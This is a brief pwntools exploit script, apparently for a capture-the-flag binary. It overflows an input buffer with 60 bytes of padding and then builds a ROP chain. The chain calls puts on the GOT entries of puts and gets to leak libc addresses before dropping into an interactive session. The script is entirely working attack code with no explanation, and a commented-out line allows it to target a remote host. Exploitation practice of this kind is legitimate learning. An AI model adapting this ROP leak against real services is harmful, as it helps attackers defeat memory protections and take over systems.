#!/usr/bin/python3
from pwn import *

#context.log_level = 'debug'
exe = context.binary = ELF("/tmp/patch/server_patched", checksec=False)

p = process()
#p = remote()

add_8esp_pop_ebx = 0x080483c6

input()

#ROP leak_puts + leak_gets
payload = b'A'*60 

payload += p32(exe.sym['puts'])
payload += p32(add_8esp_pop_ebx)
payload += p32(exe.got['puts'])
payload += p32(0)
payload += p32(0xdeadbeef)

payload += p32(exe.sym['puts'])
payload += p32(add_8esp_pop_ebx)
payload += p32(exe.got['gets'])
payload += p32(0)
payload += p32(0xdeadbeef)

p.sendlineafter(b"Input some text: ", payload)
p.recvuntil(b"Return address: ")
p.recvline()
p.recvline()

#Recv + print leak_puts + leak_gets
puts_leak = u32(p.recvline()[0:4]) #puts in ra [rdi]->\0 + \n
log.info("Puts leak:" + hex(puts_leak))

gets_leak = u32(p.recvline()[0:4])
log.info("Gets leak:" + hex(gets_leak))

p.interactive()
